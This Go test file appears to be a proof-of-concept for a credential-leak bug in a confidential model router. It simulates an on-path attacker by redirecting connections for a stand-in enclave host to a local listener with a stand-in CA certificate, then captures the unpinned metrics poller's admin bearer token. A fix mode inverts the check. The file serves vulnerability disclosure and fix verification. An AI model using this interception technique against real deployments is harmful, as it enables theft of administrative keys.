//go:build poc

package manager

// PoC: the overload poller in manager/metrics.go sends METRICS_API_KEY as a
// bearer token to https://<enclave>/metrics using a plain http.Client (WebPKI
// validation only). Unlike every other hop to a model enclave in this router
// (proxy.go, http_client.go, file_inputs.go all use TLSBoundRoundTripper
// pinned to the attested key), nothing binds the metrics scrape to the
// attested TLS key. A TLS peer that holds any WebPKI-valid certificate for the
// enclave hostname and sits on the path receives the admin key.
//
// run.sh generates a stand-in CA + leaf for gpu-1.inf6.example (POC_CERT_DIR) and
// runs this test with SSL_CERT_FILE=<ca.pem>, so the stand-in CA plays the role
// of a WebPKI CA that issued the attacker a certificate for the enclave name.
// With POC_FIX_APPLIED=1 (FIX=1 ./run.sh) the expectation is inverted.
//
// The "on-path attacker" is simulated by redirecting the dial of
// gpu-1.inf6.example:443 to the attacker's listener, which is what a host
// operator or DNS/BGP-level attacker does to the router's egress. The attacker
// never holds the attested enclave's TLS private key.

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/tinfoilsh/tinfoil-go/verifier/attestation"

	"github.com/tinfoilsh/confidential-model-router/config"
)

const pocEnclaveHost = "gpu-1.inf6.example"
const pocAdminKey = "tk_ADMIN_METRICS_API_KEY_SECRET_do_not_leak"

// selfSignedECDSA builds the genuine enclave's TLS identity: an ECDSA key whose
// fingerprint stands in for the attested TLSPublicKeyFP.
func selfSignedECDSA(t *testing.T) (tls.Certificate, string) {
	t.Helper()
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tpl := &x509.Certificate{
		SerialNumber: big.NewInt(99),
		Subject:      pkix.Name{CommonName: "genuine enclave"},
		DNSNames:     []string{pocEnclaveHost},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, tpl, tpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}, attestation.KeyFP(&key.PublicKey)
}

type capture struct {
	mu      sync.Mutex
	authz   []string
	paths   []string
	peerFPs []string
}

func (c *capture) handler(w http.ResponseWriter, r *http.Request) {
	fp := ""
	if r.TLS != nil && len(r.TLS.PeerCertificates) == 0 {
		fp = "(client presented no certificate; server key is the attacker's)"
	}
	c.mu.Lock()
	c.authz = append(c.authz, r.Header.Get("Authorization"))
	c.paths = append(c.paths, r.URL.Path)
	c.peerFPs = append(c.peerFPs, fp)
	c.mu.Unlock()
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("vllm:num_requests_waiting 0.0\n"))
}

func TestPoC_MetricsPollLeaksAdminKeyToUnpinnedPeer(t *testing.T) {
	certDir := os.Getenv("POC_CERT_DIR")
	if certDir == "" {
		t.Fatal("POC_CERT_DIR not set (use run.sh)")
	}
	fixApplied := os.Getenv("POC_FIX_APPLIED") == "1"
	if os.Getenv("SSL_CERT_FILE") == "" {
		t.Fatal("run with SSL_CERT_FILE pointing at the PoC CA (see file header)")
	}

	// 1. The genuine, attested enclave: its TLS key fingerprint is what the
	//    router pinned at addEnclave time.
	genuineCert, attestedFP := selfSignedECDSA(t)
	genuine := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("vllm:num_requests_waiting 0.0\n"))
	}))
	genuine.TLS = &tls.Config{Certificates: []tls.Certificate{genuineCert}}
	genuine.StartTLS()
	defer genuine.Close()

	// 2. The attacker: on-path, holding a WebPKI-valid certificate for the
	//    enclave hostname (issued by the CA in SSL_CERT_FILE). It never has the
	//    attested private key.
	attackerCert, err := tls.LoadX509KeyPair(filepath.Join(certDir, "leaf.pem"), filepath.Join(certDir, "leaf-key.pem"))
	if err != nil {
		t.Fatalf("load attacker cert: %v", err)
	}
	attackerFP := attestation.KeyFP(attackerCert.PrivateKey.(*ecdsa.PrivateKey).Public().(*ecdsa.PublicKey))
	cap := &capture{}
	attacker := httptest.NewUnstartedServer(http.HandlerFunc(cap.handler))
	attacker.TLS = &tls.Config{Certificates: []tls.Certificate{attackerCert}}
	attacker.StartTLS()
	defer attacker.Close()

	// 3. On-path interception: every connection the router opens to
	//    gpu-1.inf6.example:443 lands on the attacker. (A host operator does
	//    this with a DNAT rule on the enclave's NIC; a DNS/BGP attacker with
	//    a route.) Both the pinned transport and the metrics client dial
	//    through http.DefaultTransport.
	dt := http.DefaultTransport.(*http.Transport)
	origDial := dt.DialContext
	dt.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if addr == pocEnclaveHost+":443" {
			return (&net.Dialer{}).DialContext(ctx, network, strings.TrimPrefix(attacker.URL, "https://"))
		}
		if origDial != nil {
			return origDial(ctx, network, addr)
		}
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}
	defer func() { dt.DialContext = origDial }()

	// 4. The router's view of the enclave, exactly as addEnclave builds it:
	//    proxy pinned to the attested key, metrics poller started by the
	//    overload config that the control plane's runtime config carries.
	SetMetricsPollAPIKey(pocAdminKey)
	cb := newCircuitBreaker()
	enclave := &Enclave{
		host:      pocEnclaveHost,
		modelName: "llama3-3-70b",
		tlsKeyFP:  attestedFP,
		proxy:     newProxy(pocEnclaveHost, attestedFP, "llama3-3-70b", nil, cb),
		metrics:   pocNewEnclaveMetrics(pocEnclaveHost, "llama3-3-70b", attestedFP),
		cb:        cb,
	}
	enclave.updateOverloadConfig(&config.OverloadConfig{MaxRequestsWaiting: 8, RetryAfterMinutes: 1})
	defer enclave.shutdown()

	// 5. Control: an inference request through the pinned reverse proxy must
	//    NOT reach the attacker (the pin is enforced in VerifyConnection).
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "https://router.example/v1/chat/completions", strings.NewReader(`{"model":"llama3-3-70b","messages":[{"role":"user","content":"CONFIDENTIAL prompt"}]}`))
	req.Header.Set("Authorization", "Bearer tk_CUSTOMER_KEY")
	req.Header.Set("Content-Type", "application/json")
	enclave.ServeHTTP(rec, req)
	t.Logf("control: proxied inference request through pinned transport -> HTTP %d %s", rec.Code, strings.TrimSpace(rec.Body.String()))

	// 6. Wait for a couple of scrapes.
	time.Sleep(2500 * time.Millisecond)

	cap.mu.Lock()
	defer cap.mu.Unlock()
	t.Logf("attested enclave TLS key fingerprint: %s", attestedFP)
	t.Logf("attacker TLS key fingerprint:         %s", attackerFP)
	t.Logf("attacker received %d request(s)", len(cap.authz))
	leaked := false
	for i := range cap.authz {
		t.Logf("  #%d path=%s authorization=%q %s", i, cap.paths[i], cap.authz[i], cap.peerFPs[i])
		if cap.authz[i] == "Bearer "+pocAdminKey && cap.paths[i] == "/metrics" {
			leaked = true
		}
		if strings.Contains(cap.authz[i], "tk_CUSTOMER_KEY") {
			t.Fatalf("pinned proxy leaked the customer key: pin is broken, not expected")
		}
	}
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("expected the pinned proxy to fail closed with 502, got %d", rec.Code)
	}
	if fixApplied {
		if leaked {
			t.Fatalf("FIX: metrics poller still sent METRICS_API_KEY to the unpinned peer")
		}
		t.Logf("FIXED: pinned metrics poller sent nothing to the attacker (%d request(s) with the key)", len(cap.authz))
		return
	}
	if !leaked {
		t.Fatalf("expected the metrics poller to hand METRICS_API_KEY to the unpinned peer")
	}
	t.Logf("VULNERABLE: METRICS_API_KEY (%q) was sent to a TLS peer whose key (%s) is not the attested key (%s); the pinned proxy path to the same host failed closed (502)", pocAdminKey, attackerFP[:16]+"...", attestedFP[:16]+"...")
}
